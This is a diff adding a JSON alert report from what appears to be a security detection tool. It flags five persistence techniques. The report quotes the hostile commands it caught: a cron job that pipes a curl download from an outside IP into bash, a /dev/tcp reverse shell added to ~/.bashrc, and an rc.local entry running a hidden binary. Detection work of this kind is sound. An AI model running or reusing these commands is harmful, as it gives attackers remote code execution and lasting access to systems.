@@ -1,0 +1,147 @@
+{
+  "generated_at": "2025-11-08T07:52:22.180772+00:00",
+  "summary": {
+    "total_alerts": 5,
+    "severity_breakdown": {
+      "CRITICAL": 5
+    },
+    "type_breakdown": {
+      "persistence_technique_detected": 5
+    },
+    "top_subjects": [
+      "(unknown)"
+    ]
+  },
+  "alerts": [
+    {
+      "type": "persistence_technique_detected",
+      "subject": "(unknown)",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 PHÁT HIỆN: Crontab persistence - adding malicious cron job từ user '(unknown)': (itops) cmd ((crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -)",
+      "evidence": {
+        "pattern": "crontab_modification",
+        "command": "(itops) cmd ((crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -)",
+        "technique_description": "Crontab persistence - adding malicious cron job"
+      },
+      "prompt_ctx": {
+        "user": "(unknown)",
+        "group": null,
+        "behavior": {
+          "type": "persistence_technique",
+          "technique": "crontab_modification",
+          "command": "(itops) cmd ((crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -)"
+        },
+        "time": "10:00 PM, Thứ Hai, 27/10/2025",
+        "baseline": {},
+        "extras": {
+          "reason": "Crontab persistence - adding malicious cron job"
+        }
+      }
+    },
+    {
+      "type": "persistence_technique_detected",
+      "subject": "(unknown)",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 PHÁT HIỆN: Remote code execution via curl - downloading and executing remote script từ user '(unknown)': (itops) cmd ((crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -)",
+      "evidence": {
+        "pattern": "curl_exec_pattern",
+        "command": "(itops) cmd ((crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -)",
+        "technique_description": "Remote code execution via curl - downloading and executing remote script"
+      },
+      "prompt_ctx": {
+        "user": "(unknown)",
+        "group": null,
+        "behavior": {
+          "type": "persistence_technique",
+          "technique": "curl_exec_pattern",
+          "command": "(itops) cmd ((crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -)"
+        },
+        "time": "10:00 PM, Thứ Hai, 27/10/2025",
+        "baseline": {},
+        "extras": {
+          "reason": "Remote code execution via curl - downloading and executing remote script"
+        }
+      }
+    },
+    {
+      "type": "persistence_technique_detected",
+      "subject": "(unknown)",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 PHÁT HIỆN: Log contains explicit 'suspicious persistence' indicator từ user '(unknown)': suspicious persistence by itops: (crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -",
+      "evidence": {
+        "pattern": "suspicious_persistence_msg",
+        "command": "suspicious persistence by itops: (crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -",
+        "technique_description": "Log contains explicit 'suspicious persistence' indicator"
+      },
+      "prompt_ctx": {
+        "user": "(unknown)",
+        "group": null,
+        "behavior": {
+          "type": "persistence_technique",
+          "technique": "suspicious_persistence_msg",
+          "command": "suspicious persistence by itops: (crontab -l; echo \"*/5 * * * * curl -s http://198.51.100.77/sh | bash\") | crontab -"
+        },
+        "time": "10:00 PM, Thứ Hai, 27/10/2025",
+        "baseline": {},
+        "extras": {
+          "reason": "Log contains explicit 'suspicious persistence' indicator"
+        }
+      }
+    },
+    {
+      "type": "persistence_technique_detected",
+      "subject": "(unknown)",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 PHÁT HIỆN: Reverse shell via ~/.bashrc - shell modification persistence từ user '(unknown)': suspicious persistence by huydev: echo 'bash -i >& /dev/tcp/203.0.113.55/4444 0>&1' >> ~/.bashrc",
+      "evidence": {
+        "pattern": "reverse_shell_bashrc",
+        "command": "suspicious persistence by huydev: echo 'bash -i >& /dev/tcp/203.0.113.55/4444 0>&1' >> ~/.bashrc",
+        "technique_description": "Reverse shell via ~/.bashrc - shell modification persistence"
+      },
+      "prompt_ctx": {
+        "user": "(unknown)",
+        "group": null,
+        "behavior": {
+          "type": "persistence_technique",
+          "technique": "reverse_shell_bashrc",
+          "command": "suspicious persistence by huydev: echo 'bash -i >& /dev/tcp/203.0.113.55/4444 0>&1' >> ~/.bashrc"
+        },
+        "time": "10:00 PM, Thứ Hai, 27/10/2025",
+        "baseline": {},
+        "extras": {
+          "reason": "Reverse shell via ~/.bashrc - shell modification persistence"
+        }
+      }
+    },
+    {
+      "type": "persistence_technique_detected",
+      "subject": "(unknown)",
+      "severity": "CRITICAL",
+      "score": 9.0,
+      "text": "🚨 PHÁT HIỆN: RC.local persistence - system startup modification từ user '(unknown)': suspicious persistence by huyle: systemctl enable rc-local && echo '/usr/local/bin/.svc' > /etc/rc.local",
+      "evidence": {
+        "pattern": "rc_local_persistence",
+        "command": "suspicious persistence by huyle: systemctl enable rc-local && echo '/usr/local/bin/.svc' > /etc/rc.local",
+        "technique_description": "RC.local persistence - system startup modification"
+      },
+      "prompt_ctx": {
+        "user": "(unknown)",
+        "group": null,
+        "behavior": {
+          "type": "persistence_technique",
+          "technique": "rc_local_persistence",
+          "command": "suspicious persistence by huyle: systemctl enable rc-local && echo '/usr/local/bin/.svc' > /etc/rc.local"
+        },
+        "time": "10:00 PM, Thứ Hai, 27/10/2025",
+        "baseline": {},
+        "extras": {
+          "reason": "RC.local persistence - system startup modification"
+        }
+      }
+    }
+  ]
+}
